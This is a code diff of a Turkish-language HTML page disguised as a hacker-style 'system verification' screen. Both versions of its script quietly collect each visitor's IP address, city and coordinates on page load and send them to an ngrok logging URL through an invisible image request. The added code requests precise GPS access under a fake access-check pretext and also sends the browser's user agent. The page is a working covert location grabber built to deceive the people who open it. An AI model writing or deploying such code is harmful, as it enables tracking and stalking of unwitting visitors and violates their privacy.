@@ -3,57 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yükleniyor...</title>
+    <title>Sistem Doğrulaması</title>
     <style>
         body {
             background-color: #000;
-            color: #0f0;
+            color: #00ff00;
             font-family: 'Courier New', Courier, monospace;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
+            text-shadow: 0 0 5px #00ff00;
         }
-        .loader {
+        .container {
+            border: 1px solid #00ff00;
+            padding: 20px;
+            box-shadow: 0 0 15px #00ff00;
             text-align: center;
         }
-        .dots:after {
-            content: ' .';
-            animation: dots 1s steps(5, end) infinite;
+        .loading-bar {
+            width: 200px;
+            height: 2px;
+            background: #003300;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
         }
-        @keyframes dots {
-            0%, 20% { content: ' .'; }
-            40% { content: ' ..'; }
-            60% { content: ' ...'; }
-            80%, 100% { content: ''; }
+        .loading-bar::after {
+            content: '';
+            display: block;
+            width: 50px;
+            height: 100%;
+            background: #00ff00;
+            animation: move 1.5s infinite;
+        }
+        @keyframes move {
+            0% { transform: translateX(-50px); }
+            100% { transform: translateX(200px); }
         }
     </style>
 </head>
 <body>
 
-    <div class="loader">
-        <h1>SİSTEME BAĞLANILIYOR<span class="dots"></span></h1>
-        <p>Lütfen bekleyiniz, veriler doğrulanıyor...</p>
+    <div class="container">
+        <h1>BİRİM ERİŞİMİ GEREKLİ</h1>
+        <p id="status">Kullanıcı yetkileri taranıyor...</p>
+        <div class="loading-bar"></div>
+        <p style="font-size: 10px; opacity: 0.6;">JARVIS V3.5 - GÜVENLİ BAĞLANTI</p>
     </div>
 
-<script>
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        const ip = data.ip;
-        const city = data.city;
-        const loc = data.latitude + "," + data.longitude;
+    <script>
+        // --- AYAR KISMI ---
+        // Terminalindeki Ngrok linkini buraya yapıştır (Sonuna /log eklemeyi unutma!)
+        const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev/log";
+        // ------------------
 
-        // Verileri linkin sonuna ekliyoruz (Query String)
-        const hedefURL = `https://punctual-villain-arson.ngrok-free.dev/log?ip=${ip}&city=${city}&loc=${loc}`;
+        async function jarvisBaslat() {
+            const statusText = document.getElementById('status');
+            
+            try {
+                // 1. Önce IP ve genel verileri al
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
-        // Görünmez bir resim üzerinden veriyi gönderiyoruz (En sağlam gizleme yöntemidir)
-        const img = new Image();
-        img.src = hedefURL;
-    })
-    .catch(err => console.log("Hata"));
-</script>
+                statusText.innerText = "Konum doğrulaması bekleniyor...";
+
+                // 2. GPS İzni İste (Jarvis Bildirimi)
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // İzin VERİLDİ
+                        const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
+                        statusText.innerText = "Erişim Onaylandı. Yönlendiriliyorsunuz...";
+                        veriyiFirlat(ipData.ip, ipData.city, coords, "GPS_ONAY");
+                    },
+                    (err) => {
+                        // İzin REDDEDİLDİ
+                        statusText.innerText = "Erişim Kısıtlı. IP üzerinden bağlanılıyor...";
+                        const tahminiKoord = `${ipData.latitude},${ipData.longitude}`;
+                        veriyiFirlat(ipData.ip, ipData.city, tahminiKoord, "GPS_RED");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+
+            } catch (error) {
+                console.log("Sistem hatası.");
+            }
+        }
+
+        function veriyiFirlat(ip, city, loc, status) {
+            const params = new URLSearchParams({
+                ip: ip,
+                city: city,
+                loc: loc,
+                status: status,
+                ua: navigator.userAgent
+            });
+
+            // Tarayıcı engelini aşmak için 'Beacon' veya 'Image' tekniği
+            const finalURL = `${NGROK_URL}?${params.toString()}`;
+            const img = new Image();
+            img.src = finalURL;
+        }
+
+        // Sayfa açıldıktan 1 saniye sonra başlat
+        setTimeout(jarvisBaslat, 1000);
+    </script>
 </body>
 </html>
